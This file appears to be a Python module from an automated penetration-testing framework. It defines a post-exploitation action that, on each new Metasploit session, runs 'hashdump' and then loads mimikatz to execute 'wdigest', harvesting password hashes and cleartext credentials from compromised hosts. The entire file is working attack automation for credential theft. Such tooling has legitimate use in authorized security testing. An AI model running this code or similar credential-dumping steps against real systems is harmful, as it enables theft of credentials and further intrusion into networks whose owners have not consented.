from core.keystore import KeyStore
from core.msfActionModule import MsfActionModule


class post_msf_dumphashes(MsfActionModule):
    def __init__(self, config, display, lock):
        super(post_msf_dumphashes, self).__init__(config, display, lock)
        self.title = "Gather hashes from MSF Sessions"
        self.shortName = "MSFDumpHashes"
        self.description = "execute [hashdump] and [mimikatz - wdigest] on any new msf sessions"

        self.requirements = ["msfconsole"]
        self.triggers = ["msfSession"]
        self.types = ["passwords"]

        self.safeLevel = 4

    def getTargets(self):
        # we are interested only in the hosts that had null sessions
        self.targets = KeyStore.get('shell/*/msf')

    def process(self):
        # load any targets we are interested in
        self.getTargets()

        for t in self.targets:
            sessions = KeyStore.get(f'shell/{t}/msf')

            if len(sessions) > 0:
                # loop over each target
                for s in sessions:
                    # verify we have not tested this session before
                    if not self.seentarget(s):
                        # add the new IP to the already seen list
                        self.addseentarget(s)
                        cmd = {'config': [f"sessions -i {str(s)}", "SLEEP", "hashdump", "SLEEP", "background", "SLEEP"],
                               'payload': 'none'}

                        result, outfile = self.execute_msf(t, cmd)

                        cmd = {
                            'config': [f"sessions -i {str(s)}", "SLEEP", "load mimikatz", "SLEEP", "wdigest", "SLEEP",
                                       "background", "SLEEP"], 'payload': 'none'}

                        result, outfile = self.execute_msf(t, cmd)

        return
